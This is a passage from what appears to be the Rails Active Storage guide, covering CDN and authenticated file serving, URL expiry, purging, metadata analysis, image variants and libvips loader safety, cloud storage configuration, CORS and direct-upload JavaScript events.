Storage proxy controllers send HTTP headers instructing intermediaries
(including CDNs) to cache the response.

When using a CDN, you will need to ensure that the generated URLs use the CDN
host instead of your application host. There are multiple ways to achieve this,
but in general it involves tweaking your `config/routes.rb` file so that you can
generate the proper URLs for the attachments and their variations. As an
example, you could add this:

```ruby
# config/routes.rb
direct :cdn_image do |model, options|
  expires_in = options.delete(:expires_in) { ActiveStorage.urls_expire_in }

  if model.respond_to?(:signed_id)
    route_for(
      :rails_service_blob_proxy,
      model.signed_id(expires_in: expires_in),
      model.filename,
      options.merge(host: ENV["CDN_HOST"])
    )
  else
    signed_blob_id = model.blob.signed_id(expires_in: expires_in)
    variation_key  = model.variation.key
    filename       = model.blob.filename

    route_for(
      :rails_blob_representation_proxy,
      signed_blob_id,
      variation_key,
      filename,
      options.merge(host: ENV["CDN_HOST"])
    )
  end
end
```

and then generate routes like this:

```erb
<%= cdn_image_url(user.profile_photo.variant(resize_to_limit: [128, 128])) %>
```

### Authenticated Controllers

By default, all Active Storage controllers are publicly accessible. The URLs
they generate contain a blob’s [signed_id][ActiveStorage::Blob#signed_id], which
is hard to guess but permanent. Anyone who knows the URL can access the file,
even if the rest of your application requires authentication. Also, the
`before_action`s in your own controllers (such as requiring a logged-in user) do
not apply to Active Storage’s built-in controllers.

If your files require stricter access control, such as “a user may only view
their own files”, you can replace the built-in controllers with your own
authenticated controllers. These controllers should wrap the behavior of the
following built-in controllers but apply your own authorization logic before
serving the file :

* [`ActiveStorage::Blobs::RedirectController`][]
* [`ActiveStorage::Blobs::ProxyController`][]
* [`ActiveStorage::Representations::RedirectController`][]
* [`ActiveStorage::Representations::ProxyController`][]

As an example, to only allow an account to access their own logo you could do
the following:

```ruby
# config/routes.rb
resource :account do
  resource :logo
end
```

```ruby
# app/controllers/logos_controller.rb
class LogosController < ApplicationController
  # include Authentication via ApplicationController

  def show
    redirect_to Current.user.account.logo.url
  end
end
```

```erb
<%= image_tag account_logo_path %>
```

And finally, disable the Active Storage default routes with:

```ruby
config.active_storage.draw_routes = false
```

This ensures that blobs and variants cannot be accessed through the built-in
public controllers, and can only be served through your own authenticated
routing and authorization logic.

[`ActiveStorage::Blobs::RedirectController`]:
https://api.rubyonrails.org/classes/ActiveStorage/Blobs/RedirectController.html
[`ActiveStorage::Blobs::ProxyController`]:
https://api.rubyonrails.org/classes/ActiveStorage/Blobs/ProxyController.html
[`ActiveStorage::Representations::RedirectController`]:
https://api.rubyonrails.org/classes/ActiveStorage/Representations/RedirectController.html
[`ActiveStorage::Representations::ProxyController`]:
https://api.rubyonrails.org/classes/ActiveStorage/Representations/ProxyController.html

### Expiring URLs

By default, the URLs generated by Active Storage's redirect and proxy
controllers never expire but there is an `expires_in` option to limit how long URLs remain valid.

To set an expiration on a per-URL basis, pass `expires_in` when generating the
URL:

```ruby
rails_storage_redirect_url(blob, expires_in: 1.minute)
rails_storage_proxy_url(@user.profile_photo, expires_in: 1.hour)
```

To set a default expiration for all Active Storage controller URLs in your application:

```ruby
config.active_storage.urls_expire_in = 1.day
```

Note that expiring *controller URLs* is distinct from expiring *service URLs*
(the short-lived signed URLs that redirect controllers use to forward requests
to the underlying storage service such as S3). Service URLs default to expiring
in 5 minutes and can be configured separately:

```ruby
config.active_storage.service_urls_expire_in = 10.minutes
```

WARNING: The `expires_in` option is not a substitute for authenticated access
control. An expired URL simply stops working, but a URL shared before expiration
remains accessible for its full lifetime. For true access control, use
Authenticated Controllers.

Downloading Files
-----------------

Sometimes you need to process a file after it’s uploaded. For example, to
convert it to a different format. You can use the [`download`][Blob#download]
method to read the file's binary data (i.e. blob) into memory:

```ruby
binary = user.profile_photo.download
```

You can also download a file's blob to local disk so an external program (e.g. a
virus scanner or media transcoder) can operate on it. In the example below, the
blob's [`open`][Blob#open] method saves the file to a tempfile on disk and then
yields the file to the block:

```ruby
product.images.open do |file|
  system "/path/to/virus/scanner", file.path
  # ...
end
```

NOTE: Active Storage attachments are not fully available until the record’s
transaction has committed. This means methods like `download` and `open` cannot
be used reliably inside an `after_create` callback because the blob is not
persisted yet. Use `after_create_commit` if you need to process the uploaded
file immediately after creation.

[Blob#download]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob.html#method-i-download
[Blob#open]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob.html#method-i-open

Removing Files
--------------

Active Storage makes it possible to remove files from your application when they are no longer needed, whether that's when a user replaces their profile photo, deletes a product image, or as part of routine cleanup of orphaned uploads.

### Removing Attachments From a Model

To remove an attachment from a model, call [`purge`][Attached::One#purge] on the
attachment. If your application is set up to use Active Job, removal can be done
in the background as well by calling [`purge_later`][Attached::One#purge_later].
Purging destroys the attachment (`ActiveStorage::Attachment`) record. If the blob has no more attachments, the blob (`ActiveStorage::Blob`) record gets destroyed as well and the file is deleted from the storage service.

```ruby
# Removes the profile_photo
user.profile_photo.purge

# Removes the file asynchronously with Active Job.
user.profile_photo.purge_later
```

[Attached::One#purge]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/One.html#method-i-purge
[Attached::One#purge_later]:
https://api.rubyonrails.org/classes/ActiveStorage/Attached/One.html#method-i-purge_later

In order to remove a single file from a model with `has_many_attached`, you first find the record and then use `purge` or `purge_later`:

```ruby
product.images.find(image_id).purge
product.images.find(image_id).purge_later
```

### Purging Unattached Uploads and `detach`

There are cases where a file is uploaded but never attached to a record. This
can happen when using [Direct Uploads](#direct-uploads). You can query for
unattached records using the [unattached scope](https://api.rubyonrails.org/classes/ActiveStorage/Blob.html#method-c-unattached). Below is an
example using a [custom rake task](command_line.html#custom-rake-tasks) to remove unattached files:

```ruby
namespace :active_storage do
  desc "Purges unattached Active Storage blobs. Run regularly."
  task purge_unattached: :environment do
    ActiveStorage::Blob.unattached.where(created_at: ..2.days.ago).find_each(&:purge_later)
  end
end
```

WARNING: The query generated by `ActiveStorage::Blob.unattached` can be slow and
potentially disruptive on applications with larger databases.

There is also a [`detach`](https://edgeapi.rubyonrails.org/classes/ActiveStorage/Attached/One.html#method-i-detach) method, which deletes the associated attachments but leaves the blobs in place. This intentionally orphans the blob and leaves the file on the storage service.

```ruby
user.profile_photo.detach
```

This can be useful if you want to disassociate a file from a record without deleting it from storage, in case the blob is referenced elsewhere. Note that you can later find such orphaned blobs using the `unattached` scope if needed.

Analyzing Files For Metadata
----------------------------

Active Storage analyzes files to extract metadata like image dimensions, video
duration, and audio bit rate.  Once a file has been analyzed, the metadata is
stored in the `active_storage_blobs` table and can be viewed with the
[`metadata`][] method:

```irb
> user.profile_photo.metadata
=> {"identified" => true, "width" => 112, "height" => 243, "created_at" => "2026-04-05T00:11:48+02:00", "analyzed" => true}
```

Analyzed files will store additional information in the metadata hash, including
`analyzed: true`. You can check whether a blob has been analyzed by calling the
[`analyzed?`][] method on it.

```irb
> user.profile_photo.analyzed?
=> true
```

Image analysis provides `width` and `height` attributes. Video analysis provides
these, as well as `duration`, `angle`, `display_aspect_ratio`, and `video` and
`audio` booleans to indicate the presence of those channels. Audio analysis
provides `duration` and `bit_rate` attributes.

### Controlling When Analysis is Performed

You can control *when* metadata analysis is performed by using the `analyze`
option when defining attachments with `has_one_attached` or `has_many_attached`.
The default value of this option is `immediately`, but it can be set to `later`
or `lazily`:

```ruby
class User < ApplicationRecord
  # Analyze before validation (default value)
  has_one_attached :avatar, analyze: :immediately

  # Analyze after upload from local IO or via background job for direct uploads
  has_one_attached :document, analyze: :later

  # Skip automatic analysis - analyze on-demand when metadata is accessed
  has_many_attached :files, analyze: :lazily
end
```

NOTE: Attachments with `process: :immediately` variants automatically analyze
immediately to ensure metadata is available before processing.

You can set the application level default for the `analyze` option in your Rails
application configuration as well:

```ruby
# config/application.rb
config.active_storage.analyze = :later
```

### Validating Attachment Metadata

Since attachments are analyzed immediately by default, metadata is available for
model validations. For example, it's possible to validate that the uploaded
profile photo has certain dimensions:

```ruby
class User < ApplicationRecord
  has_one_attached :profile_photo

  validate :validate_profile_photo_size, if: -> { profile_photo.attached? }

  private
    def validate_profile_photo_size
      if profile_photo.metadata[:width] < 200 || profile_photo.metadata[:height] < 200
        errors.add(:profile_photo, "must be at least 200x200 pixels")
      end
    end
end
```

NOTE: Since [Direct uploads](#direct-uploads) bypass the server, files aren't
locally available for analysis. In this case, `:immediately` falls back to
`:later`, analyzing via background job after upload completes. So model
validations using metadata aren't possible. You can validate on the client side
using JavaScript instead.

[`metadata`][]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob.html#method-i-metadata
[`analyzed?`]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob/Analyzable.html#method-i-analyzed-3F

Displaying Images, Videos, and PDFs
-----------------------------------

Active Storage supports displaying a variety of files. You can use variants for
image files and previews for other files such as video or PDF. There is also a
concept for *representation*, which displays either a variant or preview
depending on the file.

### Image Variants

You can configure specific variants for attachments by calling the
[`variant`](https://api.rubyonrails.org/classes/ActiveStorage/Variant.html)
method on an attachable object:

```ruby
class User < ApplicationRecord
  has_one_attached :profile_photo do |attachable|
    attachable.variant :thumb, resize_to_limit: [100, 100]
  end
end
```

You can call `profile_photo.variant(:thumb)` in a view to get a thumb variant of
a profile photo:

```erb
<%= image_tag user.profile_photo.variant(:thumb) %>
```

There is a `process` option that can be used to control when variants are
generated. The default value for the `process` option is `lazily`. The other two
values are `later` and `immediately`.

* `:lazily` (default) - variants are created on the fly when first requested
* `:later` - variants are created in a background job after the attachment is
  saved
* `:immediately` - variants are created synchronously when the attachment is
  created

```ruby
class User < ApplicationRecord
  has_one_attached :profile_photo do |attachable|
    # Create immediately when the profile_photo is attached
    attachable.variant :thumb, resize_to_limit: [100, 100], process: :immediately

    # Create in a background job after attachment
    attachable.variant :medium, resize_to_limit: [300, 300], process: :later

    # Create on demand when first requested (default)
    attachable.variant :large, resize_to_limit: [800, 800], process: :lazily
  end
end
```

So, for example, if you know in advance that your variants will be accessed, you
can use the `process: :later` option (with both `has_one_attached` and
`has_many_attached`) to specify that Rails should generate them ahead of time
(and not lazily).

WARNING: It should be considered unsafe to provide arbitrary user supplied
transformations or parameters to variant processors. This can potentially enable
command injection vulnerabilities in your app.

WARNING: It is also recommended to implement a strict [ImageMagick security
policy](https://imagemagick.org/script/security-policy.php) when MiniMagick is the variant processor
of choice, or when libvips is delegating to ImageMagick (run `vips -l` on your platform).

#### Disabled Vips Image Loaders and Savers

libvips marks some of its image loaders and savers as
[unfuzzed](https://www.libvips.org/2022/05/28/What's-new-in-8.13.html#blocking-of-unfuzzed-loaders),
meaning they should not be used to process untrusted content. Active Storage disables all of them
while your application boots, before any initializer runs.

Doing so requires libvips 8.13 or later and ruby-vips 2.2.1 or later, which are Active Storage's
minimum supported versions. When ruby-vips is installed and either minimum is not met, Active
Storage raises a `RuntimeError` while booting rather than run in an unsecurable environment. Upgrade
libvips and ruby-vips.

Notably, ImageMagick is marked as an unfuzzed loader and is disabled by default. On many platforms,
libvips relies on ImageMagick to read BMP, ICO, and PSD files, so attachments in those formats
cannot be transformed by default on those platforms. Attaching, storing, and downloading them is
unaffected, but generating a variant raises `Vips::Error`, and analysis does not record their
`width` and `height`.

Analysis also does not record dimensions for other types that libvips reads with an unfuzzed
loader, such as SVG, JPEG XL, JPEG 2000, and Netpbm. Those types are not in the default
`ActiveStorage.variable_content_types`, so they are not variable in the first place.

The savers marked unfuzzed are typically FITS, JXL, and ImageMagick, so requesting one of those as
a variant's output format, such as `variant(format: :jxl)`, also raises `Vips::Error`.

An application that needs BMP, ICO, or PSD variants of trusted inputs can re-enable the ImageMagick
loader in an initializer:

```ruby
# config/initializers/vips.rb
Vips.block("VipsForeignLoadMagick", false) # Note this is dangerous for untrusted content!
```

Operation names and which of them are marked unfuzzed are both platform-dependent, so run `vips -l`
to see the class hierarchy for your build.

WARNING: Re-enabling unfuzzed image loaders and savers is dangerous. You should only attempt this
after researching how your distribution builds libvips and which library delegates are enabled.

WARNING: Even re-enabling only the ImageMagick loader, as illustrated above, is dangerous. libvips
delegates many more file types to ImageMagick than just BMP, ICO, and PSD, so re-enabling it exposes
a much larger attack surface. Do this only when all image uploads are trusted content, and only
alongside a strict [ImageMagick security
policy](https://imagemagick.org/script/security-policy.php).

### Non-image Previews

Some non-image files can be previewed: that is, they can be presented as images.
For example, a video file can be previewed by extracting its first frame. Out of
the box, Active Storage supports previewing videos and PDF documents. To create
a link to a lazily-generated preview, use the attachment's [`preview`][] method:

```erb
<%= image_tag message.video.preview(resize_to_limit: [100, 100]) %>
```

To add support for another format, add your own previewer. See the
[`ActiveStorage::Preview`][] documentation for more information.

[`preview`]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob/Representable.html#method-i-preview
[`ActiveStorage::Preview`]:
https://api.rubyonrails.org/classes/ActiveStorage/Preview.html

### File Representations

Active Storage supports displaying a variety of files. You can call
[`representation`][] on an attachment to display an image variant, or a preview
of a video or PDF.

Some file formats can't be previewed by Active Storage out of the box (e.g. Word
documents), so it's a good idea to call the boolean method [`representable?`]
first. In the case where `representable?` returns `false`, you can directly
[link to](#serving-files) the file instead, as shown in the example below:

```erb
<ul>
  <% @task.files.each do |file| %>
    <li>
      <% if file.representable? %>
        <%= image_tag file.representation(resize_to_limit: [100, 100]) %>
      <% else %>
        <%= link_to rails_blob_path(file, disposition: "attachment") do %>
          <%= image_tag "placeholder.png", alt: "Download file" %>
        <% end %>
      <% end %>
    </li>
  <% end %>
</ul>
```

Internally, `representation` calls `variant` for images, and `preview` for
previewable files. You can also call these methods directly.

[`representable?`]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob/Representable.html#method-i-representable-3F
[`representation`]:
https://api.rubyonrails.org/classes/ActiveStorage/Blob/Representable.html#method-i-representation

### How Lazy Processing Works

By default, Active Storage processes representations lazily. This means the
image is transformed in a separate request when needed, avoiding any work during
the initial page render.

```ruby
image_tag file.representation(resize_to_limit: [100, 100])
```

The above example will generate an `<img>` tag with the `src` attribute pointing
to the [`ActiveStorage::Representations::RedirectController`][]. When the
browser makes a request to that controller, it will perform the following:

1. Process the file and upload the processed file if necessary.
2. Return a `302` redirect to the file either to
  * the remote service (e.g., S3).
  * or `ActiveStorage::Blobs::ProxyController` which will return the file
    contents if [proxy mode](#proxy-mode) is enabled.

Loading the file lazily allows features like [single use URLs](#public-access)
to work without slowing down your initial page loads.

This works fine for most cases but if you need to generate URLs for images
immediately, you can call `.processed.url`:

```ruby
image_tag file.representation(resize_to_limit: [100, 100]).processed.url
```

The Active Storage variant tracker stores a record in the database if the
requested representation has been processed before. So the above code will only
make an API call to the remote service (e.g. S3) once. After that, the variant
will be stored and used on subsequent requests.

However, if you're rendering many images on a page, the example above can cause
an [N+1 query problem](active_record_querying.html#n-1-queries-problem). Each
call to `file.representation(...)` will look up its variant record individually,
resulting in one query per image. To avoid these extra queries, you can preload
variant records using the named scope, [`with_all_variant_records`][] on
`ActiveStorage::Attachment`.

```ruby
product.images.with_all_variant_records.each do |file|
  image_tag file.representation(resize_to_limit: [100, 100]).processed.url
end
```

The variant tracker runs automatically. It is enabled by default but can be
disabled using [`config.active_storage.track_variants`][].

[`config.active_storage.track_variants`]:
configuring.html#config-active-storage-track-variants
[`ActiveStorage::Representations::RedirectController`]:
https://api.rubyonrails.org/classes/ActiveStorage/Representations/RedirectController.html
[`with_all_variant_records`]:
https://api.rubyonrails.org/classes/ActiveStorage/Attachment.html#method-c-with_all_variant_records

Configuring Cloud Services
------------------------

Active Storage supports multiple cloud and local storage backends and each
environment in your application can use a different one. All service
configurations live in `config/storage.yml` file, where you define the
connection details for each service your app might use. Once declared, services
can be selected per-environment in `config/environments/*.rb` files.

### Define Storage Services

For each service your application uses, provide a name and the necessary
configuration details. The example below declares three services named `local`,
`test`, and `amazon`:

```yaml
local:
  service: Disk
  root: <%= Rails.root.join("storage") %>

test:
  service: Disk
  root: <%= Rails.root.join("tmp/storage") %>

# Use bin/rails credentials:edit to set the AWS secrets
amazon:
  service: S3
  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
  bucket: your_own_bucket-<%= Rails.env %>
  region: "" # e.g. 'us-east-1'
```

You can tell Active Storage which service to use by setting
`Rails.application.config.active_storage.service`. Because each environment will
likely use a different service, it is recommended to do this on a
per-environment basis. To use the disk service from the previous example in the
development environment, you would add the following to
`config/environments/development.rb`:

```ruby
config.active_storage.service = :local
```

To use the S3 service in production, you would add the following to
`config/environments/production.rb`:

```ruby
config.active_storage.service = :amazon
```

To use the test service when testing, you would add the following to
`config/environments/test.rb`:

```ruby
config.active_storage.service = :test
```

NOTE: Configuration files that are environment-specific will take precedence: in
production, for example, the `config/storage/production.yml` file will take
precedence over the `config/storage.yml` file.

It’s a good practice to include `Rails.env` in your bucket names (i.e. storage
containers). This helps prevent accidental cross-environment access or data
loss, such as overwriting production data while working in development.

```yaml
amazon:
  service: S3
  # ...
  bucket: your_own_bucket-<%= Rails.env %>

google:
  service: GCS
  # ...
  bucket: your_own_bucket-<%= Rails.env %>
```

Next, let's look at how to configure Active Storage's built-in service adapters
(e.g. `Disk` and `S3`). A service adapter is the component that knows how to
store, retrieve, and delete files on a particular backend.

### Disk Service

Configuring a Disk service is straightforward, as we have seen in
`config/storage.yml`:

```yaml
local:
  service: Disk
  root: <%= Rails.root.join("storage") %>
```

### S3 Service (Amazon S3 and S3-compatible APIs)

Active Storage’s built-in S3 service adapter relies on the official AWS SDK to
communicate with Amazon S3 (or any S3-compatible service). Rails does not bundle
the AWS SDK by default, so you must add the `aws-sdk-s3` gem to your
application’s Gemfile:

```ruby
gem "aws-sdk-s3", require: false
```

The `require: false` option avoids loading the SDK automatically. Active Storage
will load it only when the S3 service is used, keeping application boot time and
memory usage lower.

To connect to Amazon S3, you can configure an `S3` service in
`config/storage.yml`:

```yaml
amazon:
  service: S3
  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
  region: "" # e.g. 'us-east-1'
  bucket: your_own_bucket-<%= Rails.env %>
```

NOTE: The above configuration assumes that AWS secrets are stored using
`bin/rails credentials:edit` with the appropriate keys. See the [Security
Guide](security.html#custom-credentials) for more.

There are other optional configurations as well - such as HTTP timeouts, retry
limits, and upload options - that can be included:

```yaml
amazon:
  # ...
  http_open_timeout: 0
  http_read_timeout: 0
  retry_limit: 0
  upload:
    server_side_encryption: "" # 'aws:kms' or 'AES256'
    cache_control: "private, max-age=<%= 1.day.to_i %>"
```

The `cache_control` option adds the `Cache-Control` header to uploaded files, so
that an image downloaded from the server won't get loaded again by the browser
if it's present in the browser's cache and not expired.

TIP: Set sensible client HTTP timeouts and retry limits for your application. In
certain failure scenarios, the default AWS client configuration may cause
connections to be held for up to several minutes and lead to request queuing.

NOTE: If you want to use environment variables, standard SDK configuration
files, profiles, IAM instance profiles or task roles, you can omit the
`access_key_id`, `secret_access_key`, and `region` keys in the example above.
The S3 Service supports all of the authentication options described in the [AWS
SDK
documentation](https://docs.aws.amazon.com/sdk-for-ruby/v3/developer-guide/setup-config.html).

You can also connect to an S3-compatible object storage API such as DigitalOcean
Spaces by providing an `endpoint`:

```yaml
digitalocean:
  service: S3
  endpoint: https://nyc3.digitaloceanspaces.com
  access_key_id: <%= Rails.application.credentials.dig(:digitalocean, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:digitalocean, :secret_access_key) %>
  # ...and other options
```

NOTE: The core features of Active Storage require the following permissions:
`s3:ListBucket`, `s3:PutObject`, `s3:GetObject`, and `s3:DeleteObject`. [Public
access](#public-access) additionally requires `s3:PutObjectAcl`. If you have
additional upload options configured such as setting ACLs then additional
permissions may be required.

There are many other options available. You can see them in the [AWS S3
Client](https://docs.aws.amazon.com/sdk-for-ruby/v3/api/Aws/S3/Client.html#initialize-instance_method)
documentation.

### Google Cloud Storage Service

You'll need  to add the
[`google-cloud-storage`](https://github.com/GoogleCloudPlatform/google-cloud-ruby/tree/main/google-cloud-storage)
gem to your `Gemfile` to use the `GCS` service for Active Storage:

```ruby
gem "google-cloud-storage", "~> 1.11", require: false
```

The `require: false` option avoids loading the gem automatically. Active Storage
will load it only when the GCS service is used, keeping application boot time
and memory usage lower.

Then you can declare a Google Cloud Storage service in `config/storage.yml`:

```yaml
google:
  service: GCS
  credentials: <%= Rails.root.join("path/to/keyfile.json") %>
  project: ""
  bucket: your_own_bucket-<%= Rails.env %>
```

You can also provide a Hash of credentials instead of a keyfile path, and
optionally provide a Cache-Control header:

```yaml
# Use bin/rails credentials:edit to set the GCS secrets (as gcs:private_key_id|private_key)
google:
  service: GCS
  credentials:
    type: "service_account"
    project_id: ""
    private_key_id: <%= Rails.application.credentials.dig(:gcs, :private_key_id) %>
    private_key: <%= Rails.application.credentials.dig(:gcs, :private_key).dump %>
    client_email: ""
    client_id: ""
    auth_uri: "https://accounts.google.com/o/oauth2/auth"
    token_uri: "https://accounts.google.com/o/oauth2/token"
    auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs"
    client_x509_cert_url: ""
  project: ""
  bucket: your_own_bucket-<%= Rails.env %>
  cache_control: "public, max-age=3600"
```

You can optionally use
[IAM](https://cloud.google.com/storage/docs/access-control/signed-urls#signing-iam)
instead of the `credentials` when signing URLs. This is useful if you are
authenticating your GKE (Google Kubernetes Engine) applications with Workload
Identity, see [this Google Cloud blog
post](https://cloud.google.com/blog/products/containers-kubernetes/introducing-workload-identity-better-authentication-for-your-gke-applications)
for more information.

```yaml
google:
  service: GCS
  # ...
  iam: true
```

You can specify a GSA (Google Service Account) when signing URLs. When using
IAM, the [metadata
server](https://cloud.google.com/compute/docs/storing-retrieving-metadata) will
be contacted to get the GSA email, but this metadata server is not always
present (e.g. local tests) and you may wish to use a non-default GSA.

```yaml
google:
  service: GCS
  # ...
  iam: true
  gsa_email: "foobar@baz.iam.gserviceaccount.com"
```

### Mirror Service

Active Storage lets you keep multiple services in sync by defining a mirror
service. A mirror service replicates uploads and deletes across two or more
subordinate services, ensuring that files exist in multiple locations.

Mirror services are primarily intended for temporary use during migrations
between storage backends. The typical workflow is:

1. Start mirroring uploads to a new service alongside the existing one.
2. Copy any pre-existing files from the old service to the new one.
3. Switch entirely to the new service once all files are replicated.

NOTE: Mirroring is not atomic. It’s possible for an upload to succeed on the
primary service but fail on one or more mirrors. Before switching fully to the
new service, ensure that all files have been successfully copied.

In order to define a `Mirror` service, first define each service you want to
mirror as usual. Then, reference them by name in the `Mirror` service
configuration:

```yaml
s3_west_coast:
  service: S3
  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
  region: "" # e.g. 'us-west-1'
  bucket: your_own_bucket-<%= Rails.env %>

s3_east_coast:
  service: S3
  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>
  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>
  region: "" # e.g. 'us-east-1'
  bucket: your_own_bucket-<%= Rails.env %>

production:
  service: Mirror
  primary: s3_east_coast
  mirrors:
    - s3_west_coast
```

While all secondary services receive uploads, downloads are always handled by
the primary service.

Mirror services are compatible with [direct uploads](#direct-uploads). New files
are directly uploaded to the primary service. When a directly-uploaded file is
attached to a record, a background job is enqueued to copy it to the secondary
services.

### Public Access

By default, Active Storage assumes private access to services. This means
generating signed, single-use URLs for blobs. If you'd rather make blobs
publicly accessible, specify `public: true` in your app's `config/storage.yml`:

```yaml
gcs: &gcs
  service: GCS
  project: ""

private_gcs:
  <<: *gcs
  credentials: <%= Rails.root.join("path/to/private_key.json") %>
  bucket: your_own_bucket-<%= Rails.env %>

public_gcs:
  <<: *gcs
  credentials: <%= Rails.root.join("path/to/public_key.json") %>
  bucket: your_own_bucket-<%= Rails.env %>
  public: true
```

Make sure your buckets are properly configured for public access. See docs on
how to enable public read permissions for [Amazon
S3](https://docs.aws.amazon.com/AmazonS3/latest/user-guide/block-public-access-bucket.html)
and [Google Cloud
Storage](https://cloud.google.com/storage/docs/access-control/making-data-public#buckets)
storage services. Amazon S3 additionally requires that you have the
`s3:PutObjectAcl` permission.

When converting an existing application to use `public: true`, make sure to
update every individual file in the bucket to be publicly-readable before
switching over.

### Implementing Other Cloud Services

If you need to support a cloud service other than the ones covered above, you
can implement your custom service by extending
[`ActiveStorage::Service`](https://api.rubyonrails.org/classes/ActiveStorage/Service.html)
and implementing the methods necessary to upload and download files to the
cloud.

Direct Uploads
--------------

By default, files uploaded through Active Storage are sent to your Rails server
first, then forwarded to the configured storage service. Direct uploads bypass
the Rails server entirely, sending files straight from the browser to the
storage service. Direct uploads provide improved performance as large files do
not have to pass through your Rails server.

Direct uploads integrate seamlessly with Active Storage’s attachments and
variants, allowing you to use the same models, validations, and background
processing workflows as standard uploads.

Active Storage, with its included JavaScript library, supports uploading
directly from the client to the cloud.

### Setup JavaScript Library

In order to start using direct uploads, you'll need to use the JavaScript
Library included with Active Storage. The library handles:

* Initiating uploads to the configured service (e.g., S3, GCS, Azure).
* Tracking upload progress and reporting it to the user.
* Updating form inputs with the necessary signed IDs so that Rails can associate
  the uploaded file with the model when the form is submitted.

To use direct uploads, you'll need to include the library in your application’s
JavaScript bundle and enable the `direct_upload: true` option on your file input
fields. This allows Rails and the storage service to coordinate securely using
signed IDs, without requiring extra backend configuration.

There are several ways to include the Active Storage JavaScript library in your
application:

#### `javascript_include_tag`

Use `javascript_include_tag` to include the library in your HTML
without bundling through the asset pipeline. Autostart is enabled
automatically:

```erb
<%= javascript_include_tag "activestorage" %>
```

#### Importmaps

Use Importmap (ESM) to pin the library in `config/importmap.rb`:

```ruby
pin "@rails/activestorage", to: "activestorage.esm.js"
```

Then import and start it in your HTML:

```html
<script type="module-shim">
  import * as ActiveStorage from "@rails/activestorage"
  ActiveStorage.start()
</script>
```

#### npm package

Install the npm package via npm/yarn and import it in your JavaScript
bundle:

```js
import * as ActiveStorage from "@rails/activestorage"
ActiveStorage.start()
```

All of these approaches provide the same functionality; choose the one that
matches your application’s JavaScript setup.

### Enabling Direct Uploads on the Input

Next step is to set the `direct_upload: true` option in your [`file_field`
helper](form_helpers.html#uploading-files) to automatically annotate the input
field with the direct upload URL via `data-direct-upload-url` attribute.

```erb
<%= form.file_field :attachments, multiple: true, direct_upload: true %>
```

Or, if you aren't using a `FormBuilder`, add the data attribute directly:

```erb
<input type="file" data-direct-upload-url="<%= rails_direct_uploads_url %>" />
```

Lastly, You'll need to configure CORS on third-party storage services to allow
direct upload requests.

### Cross-Origin Resource Sharing (CORS) Configuration

To make direct uploads to a third-party service work, you’ll need to configure
the service to allow cross-origin requests from your app. Consult the CORS
documentation for your service:

* [S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/enabling-cors-examples.html)
* [Google Cloud Storage](https://cloud.google.com/storage/docs/configuring-cors)

Take care to allow:

* All origins from which your app is accessed
* The `PUT` request method
* The following headers:
  * `Content-Type`
  * `Content-MD5`
  * `Content-Disposition`
  * `Cache-Control` (for GCS, only if `cache_control` is set)

No CORS configuration is required for the Disk service since it shares your
app’s origin.

#### Example: S3 CORS Configuration

```json
[
  {
    "AllowedHeaders": [
      "Content-Type",
      "Content-MD5",
      "Content-Disposition"
    ],
    "AllowedMethods": [
      "PUT"
    ],
    "AllowedOrigins": [
      "https://www.example.com"
    ],
    "MaxAgeSeconds": 3600
  }
]
```

#### Example: Google Cloud Storage CORS Configuration

```json
[
  {
    "origin": ["https://www.example.com"],
    "method": ["PUT"],
    "responseHeader": ["Content-Type", "Content-MD5", "Content-Disposition"],
    "maxAgeSeconds": 3600
  }
]
```

### Direct Upload JavaScript Events

The JavaScript library supports events that can be used for the upload form:

| Event name | Event target | Event data (`event.detail`) | Description |
| --- | --- | --- | --- |
| `direct-uploads:start` | `<form>` | None | A form containing files for direct upload fields was submitted. |
| `direct-upload:initialize` | `<input>` | `{id, file}` | Dispatched for every file after form submission. |
| `direct-upload:start` | `<input>` | `{id, file}` | A direct upload is starting. |
| `direct-upload:before-blob-request` | `<input>` | `{id, file, xhr}` | Before making a request to your application for direct upload metadata. |
| `direct-upload:before-storage-request` | `<input>` | `{id, file, xhr}` | Before making a request to store a file. |
| `direct-upload:progress` | `<input>` | `{id, file, progress}` | As requests to store files progress. |
| `direct-upload:error` | `<input>` | `{id, file, error}` | An error occurred. An `alert` will display unless this event is canceled. |
| `direct-upload:end` | `<input>` | `{id, file}` | A direct upload has ended. |
| `direct-uploads:end` | `<form>` | None | All direct uploads have ended. |

### Example

You can use these events to show the progress of an upload.

![direct-uploads](https://user-images.githubusercontent.com/5355/28694528-16e69d0c-72f8-11e7-91a7-c0b8cfc90391.gif)

To show the progress of the uploaded files in a form add the following
javascript:

```js
// app/javascript/direct_uploads.js
addEventListener("direct-upload:initialize", event => {
  const { target, detail } = event
  const { id, file } = detail
  target.insertAdjacentHTML("beforebegin", `
    <div id="direct-upload-${id}" class="direct-upload direct-upload--pending">
      <div id="direct-upload-progress-${id}" class="direct-upload__progress" style="width: 0%"></div>
      <span class="direct-upload__filename"></span>
    </div>
  `)
  target.previousElementSibling.querySelector(`.direct-upload__filename`).textContent = file.name
})

addEventListener("direct-upload:start", event => {
  const { id } = event.detail
  const element = document.getElementById(`direct-upload-${id}`)
  element.classList.remove("direct-upload--pending")
})

addEventListener("direct-upload:progress", event => {
  const { id, progress } = event.detail
  const progressElement = document.getElementById(`direct-upload-progress-${id}`)
  progressElement.style.width = `${progress}%`
})

addEventListener("direct-upload:error", event => {
  event.preventDefault()
  const { id, error } = event.detail
  const element = document.getElementById(`direct-upload-${id}`)
  element.classList.add("direct-upload--error")
  element.setAttribute("title", error)
})

addEventListener("direct-upload:end", event => {
  const { id } = event.detail
